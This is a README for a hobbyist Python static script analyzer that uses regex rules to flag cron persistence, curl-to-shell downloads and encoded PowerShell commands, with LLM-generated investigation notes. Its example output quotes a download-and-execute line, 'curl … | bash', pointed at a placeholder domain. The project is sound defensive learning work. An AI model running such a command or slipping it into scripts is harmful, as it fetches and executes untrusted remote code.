# ✝ The Rootkit Exorcist 👻

**The terminal is blessed. The scripts are not.**

A Python-based static script analyzer that identifies potentially suspicious command patterns and uses Ollama with Llama 3.2 to generate supplementary investigation notes.

Built for the Hacktoberfest 2026 Week 4 DEV Challenge, The Rootkit Exorcist combines practical cybersecurity analysis with supernatural humor.

> ✝ THE POWER OF CHMOD COMPELS YOU! ✝

## What Does It Do?

The Rootkit Exorcist reads script files as text **without executing them**.

It uses Python regular-expression rules to identify selected suspicious command patterns and provides two reporting modes:

- **SOC Mode:** Professional, evidence-focused security reporting.
- **Exorcist Mode:** Dramatic cybersecurity commentary with a spooky personality.

Both modes use the same detection engine.

## Detection Capabilities

| Rule | Detection | Severity | MITRE ATT&CK |
|---|---|---|---|
| EXO-001 | Potential cron persistence | MEDIUM | T1053.003 |
| EXO-002 | Remote download piped into a shell | HIGH | T1105 |
| EXO-003 | PowerShell encoded command | MEDIUM | T1027 |

These are heuristic indicators, not proof of malicious activity. Legitimate scripts can contain similar commands.

Despite its name, this project does not detect kernel rootkits or perform system-level rootkit scanning.

## Automated Testing

The Rootkit Exorcist includes five automated unit tests using Python's built-in `unittest` framework.

The tests cover:

- Cron persistence detection
- Download-and-execute detection
- PowerShell encoded-command detection
- Benign script handling
- False-positive prevention for `crontab -l`

Run the test suite from the project root:

```bash
python -m unittest discover -s tests -v
```

All five tests passed during initial validation.

These tests verify selected detection behaviors; they do not establish comprehensive malware detection coverage.

## How It Works

1. The user provides a script file.
2. Python reads the file as text.
3. Regular-expression rules identify selected suspicious patterns.
4. The CLI displays severity, line numbers, evidence, descriptions, and MITRE ATT&CK mappings.
5. When findings exist, Llama 3.2 generates supplementary investigation notes through Ollama.
6. Optionally, the results can be exported as a Markdown report.

**The Python scanner produces the authoritative findings. AI does not decide whether a detection exists.**

## Requirements

- Python 3
- Ollama
- `llama3.2:1b` model

The Python implementation uses standard-library modules for the CLI and Ollama HTTP requests.

## Getting Started

Clone the repository:

```bash
git clone https://github.com/Tash925/rootkit-exorcist.git
cd rootkit-exorcist
```

Install Ollama using the instructions at https://ollama.com.

Download the model:

```bash
ollama pull llama3.2:1b
```

Start Ollama if it is not already running:

```bash
ollama serve
```

Keep Ollama running and open another terminal to use the analyzer.

### SOC Mode

```bash
python exorcist.py samples/suspicious.sh --mode soc
```

### Exorcist Mode

```bash
python exorcist.py samples/suspicious.sh --mode exorcist
```

Exorcist Mode is the default:

```bash
python exorcist.py samples/suspicious.sh
```

### Benign Sample

```bash
python exorcist.py samples/benign.sh --mode soc
```

Expected output:

```text
No suspicious patterns detected by current rules.
This does NOT guarantee the script is safe.
```

## Exporting Markdown Reports

To save an analysis as a Markdown report:

```bash
python exorcist.py samples/suspicious.sh --mode soc --output report.md
```

Open `report.md` in VS Code or another Markdown viewer to review the formatted findings.

The report includes:

- Analyzed file and reporting mode
- Detection names and severity levels
- Line numbers and evidence
- MITRE ATT&CK mappings
- AI-generated investigation notes
- Safety limitations

Generated `report.md` files are excluded from version control through `.gitignore`.

**Current limitation:** The export feature generates a report when findings exist. A no-findings result is displayed in the terminal but is not currently exported.

## Example Detection

```text
[HIGH] Download and Execute
  Line: 4
  MITRE ATT&CK: T1105
  Evidence: curl https://example.invalid/setup.sh | bash
  Meaning: A remote script may be downloaded and passed to a shell.
```

The example uses a reserved demonstration domain.

The analyzer identifies suspicious syntax but does not establish that the command executed or that a system was compromised.

## Why Use AI?

Security findings are most useful when people can understand them.

The AI explanation layer translates detection results into readable investigation notes while the Python scanner preserves the original evidence.

This separation is intentional.

AI-generated explanations may omit findings, overinterpret evidence, or suggest unsupported conclusions. Always independently validate security conclusions.

**Evidence first. Interpretation second. Human judgment always.**

## Safety and Limitations

- The analyzer reads scripts as text and does not intentionally execute them.
- No automatic remediation or deletion is performed.
- Detection coverage is limited to the implemented patterns.
- False positives and false negatives are possible.
- MITRE ATT&CK mappings provide context, not proof of an attack.
- AI responses are supplementary and require human review.
- Ollama runs in the environment hosting the analyzer. In GitHub Codespaces, that is a cloud development environment rather than the user's personal computer.

Use synthetic or appropriately authorized samples. Never execute suspicious scripts merely to test this tool.

**This is an educational prototype, not a production malware scanner or endpoint protection system.**

## Future Improvements

- Automated unit tests
- Additional detection rules
- Improved false-positive handling
- More reliable AI explanations
- Structured JSON reporting
- Markdown export for benign samples

## Why I Built This

I'm a data analyst transitioning into cybersecurity, and I've been exploring how Python, detection engineering, incident investigation, and AI-assisted analysis work together.

I wanted to create something playful while reinforcing an important security principle: a confident AI explanation is not a substitute for verified evidence.

The Rootkit Exorcist is part of my hands-on cybersecurity learning journey through DataSec Chronicles.

## Project

Created by **DataSec Chronicles** for Hacktoberfest 2026.

[DataSec Chronicles](https://www.datasecchronicles.com)

---

*The terminal is blessed. The scripts are not.*

**✝ THE POWER OF CHMOD COMPELS YOU! ✝**
